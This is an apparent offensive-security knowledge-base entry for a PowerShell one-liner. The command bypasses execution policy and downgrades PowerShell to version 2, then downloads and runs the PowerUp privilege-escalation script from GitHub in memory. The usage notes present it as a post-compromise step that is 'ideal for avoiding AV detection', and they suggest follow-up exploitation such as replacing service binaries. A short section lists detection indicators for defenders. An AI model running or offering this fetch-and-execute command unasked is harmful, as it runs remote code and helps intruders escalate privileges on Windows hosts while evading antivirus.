---
id: ca9ce6cc-a7b9-4ec9-8b3d-2cb3604e4d5f
type: code
name: powershell-download-and-run-powerup
language: powershell
verified: true
created_at: '2023-04-06T03:56:28.513654+00:00'
updated_at: '2023-04-10T20:37:50.960310+00:00'
platforms:
  - Windows
tags:
  - privesc
  - enumeration
validated: true
---

# powershell-download-and-run-powerup

## Code

```powershell
powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
```

## Description

This code downloads and executes the PowerUp script remotely via PowerShell, running all privilege escalation checks without local file staging. It identifies misconfigurations like modifiable services or weak scheduled tasks.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| N/A | No user-defined variables; uses hardcoded GitHub URL | N/A |

## Usage

Execute in a low-priv shell post-compromise to enumerate privesc vectors. Ideal for avoiding AV detection by not dropping files. Follow up by exploiting findings, e.g., replacing a service binary.

## Detection

- PowerShell download from GitHub (network logs for raw.githubusercontent.com).
- Execution of IEX/DownloadString (Module logging).
- Anomalous checks on services/registry (Sysmon Event ID 1 for process creation).

## Related

- [[procedures/windows-privilege-escalation-using-powerup-privesccheck-and-wes-ng]]
- [[tools/PowerUp]]
